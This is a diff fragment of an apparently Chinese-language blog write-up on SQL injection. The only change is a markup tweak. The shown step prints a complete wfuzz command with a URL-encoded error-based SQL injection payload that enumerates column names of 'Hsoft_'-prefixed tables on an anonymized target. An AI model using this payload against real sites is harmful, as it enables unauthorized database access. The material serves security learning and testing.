@@ -118,7 +118,7 @@ table_list <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#3
 <p>到第16个因为原始语句有干扰，不能继续取得后续的表名，但我不想放弃。</p>
 <p>于是，又想到通过FUZZ的方式：</p>
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/835850cccf61c6d461e1fa9e4bede6bc.png" alt="2020-03-01-11-34-39"></p>
-<pre><code>wfuzz -c -z file,/usr/shar/sqlmap/data/common-table.txt --sc 500 &quot;http://www.xxx/xxx?cid=1%27%20and%20%20(select%20top%201%20COLUMN_NAME%20from%20xxx.information_schema.columns%20where%20TABLE_NAME=%27Hsoft_FUZZ%27%20and%20COLUMN_NAME%20not%20in(%27x%27))%3E0%20and%20%27s%27=%27s&quot;
+<pre tabindex="0"><code>wfuzz -c -z file,/usr/shar/sqlmap/data/common-table.txt --sc 500 &quot;http://www.xxx/xxx?cid=1%27%20and%20%20(select%20top%201%20COLUMN_NAME%20from%20xxx.information_schema.columns%20where%20TABLE_NAME=%27Hsoft_FUZZ%27%20and%20COLUMN_NAME%20not%20in(%27x%27))%3E0%20and%20%27s%27=%27s&quot;
 </code></pre><ul>
 <li><code>Hsoft_</code> 为前缀</li>
 <li>sc 500 只匹配错误页面（报错注入）</li>
